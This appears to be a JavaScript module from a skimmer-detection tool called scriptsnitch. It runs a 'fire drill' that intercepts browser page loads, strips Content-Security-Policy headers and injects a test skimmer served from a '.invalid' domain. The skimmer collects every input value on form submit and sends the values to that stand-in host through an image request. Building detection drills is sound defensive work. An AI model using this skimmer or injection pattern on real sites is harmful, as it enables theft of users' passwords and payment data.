// Fire drills (design §12): inside the browser only, the page's document is served with a harmless
// test skimmer from a domain that can never exist. It listens on sensitive fields and sends their
// values on submit; the report checks that scriptsnitch raised the findings it should. Nothing
// touches the site's server. The drill removes the page's CSP in its own visit so the test skimmer
// can run at all.

export const DRILL_ORIGIN = 'https://drill.scriptsnitch.invalid';

const SKIMMER = `(function () {
  function arm() {
    document.querySelectorAll('input[type=password], input[autocomplete^="cc-"]').forEach(function (el) {
      el.addEventListener('keydown', function scriptsnitchDrill() {});
    });
    document.addEventListener('submit', function () {
      var values = [];
      document.querySelectorAll('input').forEach(function (i) { if (i.value) values.push(i.value); });
      new Image().src = '${DRILL_ORIGIN}/c?d=' + encodeURIComponent(values.join('|'));
    }, true);
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', arm); else arm();
})();`;

const DROPPED_HEADERS = /^(content-length|content-encoding|transfer-encoding|content-security-policy|content-security-policy-report-only)$/i;

export async function installDrill(ctx, sessionId) {
  let active = true;
  ctx.on('Fetch.requestPaused', async (p, sid) => {
    if (!active || sid !== sessionId) return;
    const respond = (params) => ctx.send('Fetch.fulfillRequest', { requestId: p.requestId, ...params }, sid).catch(() => {});
    if (p.request.url.startsWith(DRILL_ORIGIN)) {
      respond({ responseCode: 200, responseHeaders: [{ name: 'content-type', value: 'text/javascript' }], body: Buffer.from(SKIMMER).toString('base64') });
      return;
    }
    if (p.resourceType === 'Document' && p.responseStatusCode !== undefined) {
      const body = await ctx.send('Fetch.getResponseBody', { requestId: p.requestId }, sid).catch(() => null);
      if (!body) {
        ctx.send('Fetch.continueRequest', { requestId: p.requestId }, sid).catch(() => {});
        return;
      }
      let html = Buffer.from(body.body, body.base64Encoded ? 'base64' : 'utf8').toString('utf8');
      const tag = `<script src="${DRILL_ORIGIN}/skim.js"></script>`;
      html = /<head[^>]*>/i.test(html) ? html.replace(/<head[^>]*>/i, (m) => m + tag) : tag + html;
      respond({ responseCode: p.responseStatusCode, responseHeaders: (p.responseHeaders ?? []).filter((h) => !DROPPED_HEADERS.test(h.name)), body: Buffer.from(html).toString('base64') });
      return;
    }
    ctx.send('Fetch.continueRequest', { requestId: p.requestId }, sid).catch(() => {});
  });
  await ctx.send('Fetch.enable', { patterns: [{ urlPattern: `${DRILL_ORIGIN}/*`, requestStage: 'Request' }, { urlPattern: '*', resourceType: 'Document', requestStage: 'Response' }] }, sessionId);
  return {
    stop() {
      active = false;
    },
  };
}
